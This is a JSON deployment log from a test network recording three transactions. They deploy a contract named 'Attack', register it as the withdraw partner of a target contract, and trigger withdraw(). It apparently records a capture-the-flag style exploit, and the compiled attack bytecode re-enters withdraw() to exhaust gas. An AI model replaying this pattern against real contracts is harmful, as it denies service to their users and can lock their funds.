{
  "transactions": [
    {
      "hash": "0x14533549cb080ee81ac1e8dcb177714a8043e05d0fda702aeca75377916fa208",
      "transactionType": "CREATE",
      "contractName": "Attack",
      "contractAddress": "0x9770ab1be752ddc4f2266c01024631e016eddfb3",
      "function": null,
      "arguments": [
        "0x8fBB1e2dA21ca6835F891f2D497E88B50A84dc78"
      ],
      "transaction": {
        "from": "0x97a008fe1887b1448313b69f4324194a8e2a739d",
        "gas": "0x217f0",
        "value": "0x0",
        "input": "0x6080604052348015600e575f5ffd5b50604051610105380380610105833981016040819052602b91604e565b5f80546001600160a01b0319166001600160a01b03929092169190911790556079565b5f60208284031215605d575f5ffd5b81516001600160a01b03811681146072575f5ffd5b9392505050565b6080806100855f395ff3fe608060408190525f8054633ccfd60b60e01b83526001600160a01b031691633ccfd60b916084916004818387803b1580156037575f5ffd5b505af11580156048573d5f5f3e3d5ffd5b00fea26469706673582212206b703062c82e70aa7f8ab07ad77fce45fa91be74fe071c8997654b15acccbf1964736f6c634300081c00330000000000000000000000008fbb1e2da21ca6835f891f2d497e88b50a84dc78",
        "nonce": "0xf0",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0xac2c5f744b55466fdeb3f288bef029af8f30f82f49f3460a2f8e6da6284e770b",
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0x8fbb1e2da21ca6835f891f2d497e88b50a84dc78",
      "function": "setWithdrawPartner(address)",
      "arguments": [
        "0x9770Ab1BE752ddC4f2266C01024631E016eDDfb3"
      ],
      "transaction": {
        "from": "0x97a008fe1887b1448313b69f4324194a8e2a739d",
        "to": "0x8fbb1e2da21ca6835f891f2d497e88b50a84dc78",
        "gas": "0xecaa",
        "value": "0x0",
        "input": "0x4e1c59140000000000000000000000009770ab1be752ddc4f2266c01024631e016eddfb3",
        "nonce": "0xf1",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0xba88f1b69b6baec94737629c4928e17fa3c5cb1a3cda32b12a34c3faebcba17e",
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0x8fbb1e2da21ca6835f891f2d497e88b50a84dc78",
      "function": "withdraw()",
      "arguments": [],
      "transaction": {
        "from": "0x97a008fe1887b1448313b69f4324194a8e2a739d",
        "to": "0x8fbb1e2da21ca6835f891f2d497e88b50a84dc78",
        "gas": "0x6e1a2f",
        "value": "0x0",
        "input": "0x3ccfd60b",
        "nonce": "0xf2",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    }
  ],
  "receipts": [
    {
      "status": "0x1",
      "cumulativeGasUsed": "0xd704ff",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x2",
      "transactionHash": "0x14533549cb080ee81ac1e8dcb177714a8043e05d0fda702aeca75377916fa208",
      "transactionIndex": "0x11a",
      "blockHash": "0xd4128da3040036cfeea41385ead733c651da3e5c681e23f14127bb284c301421",
      "blockNumber": "0x75e7f2",
      "gasUsed": "0x19c43",
      "effectiveGasPrice": "0x2f232bc80",
      "from": "0x97a008fe1887b1448313b69f4324194a8e2a739d",
      "to": null,
      "contractAddress": "0x9770ab1be752ddc4f2266c01024631e016eddfb3"
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0xd7b057",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x2",
      "transactionHash": "0xac2c5f744b55466fdeb3f288bef029af8f30f82f49f3460a2f8e6da6284e770b",
      "transactionIndex": "0x11b",
      "blockHash": "0xd4128da3040036cfeea41385ead733c651da3e5c681e23f14127bb284c301421",
      "blockNumber": "0x75e7f2",
      "gasUsed": "0xab58",
      "effectiveGasPrice": "0x2f232bc80",
      "from": "0x97a008fe1887b1448313b69f4324194a8e2a739d",
      "to": "0x8fbb1e2da21ca6835f891f2d497e88b50a84dc78",
      "contractAddress": null
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0xfd19f5",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x2",
      "transactionHash": "0xba88f1b69b6baec94737629c4928e17fa3c5cb1a3cda32b12a34c3faebcba17e",
      "transactionIndex": "0x11c",
      "blockHash": "0xd4128da3040036cfeea41385ead733c651da3e5c681e23f14127bb284c301421",
      "blockNumber": "0x75e7f2",
      "gasUsed": "0x25699e",
      "effectiveGasPrice": "0x2f232bc80",
      "from": "0x97a008fe1887b1448313b69f4324194a8e2a739d",
      "to": "0x8fbb1e2da21ca6835f891f2d497e88b50a84dc78",
      "contractAddress": null
    }
  ],
  "libraries": [],
  "pending": [],
  "returns": {},
  "timestamp": 1739798115,
  "chain": 11155111,
  "commit": "ab8a5cd"
}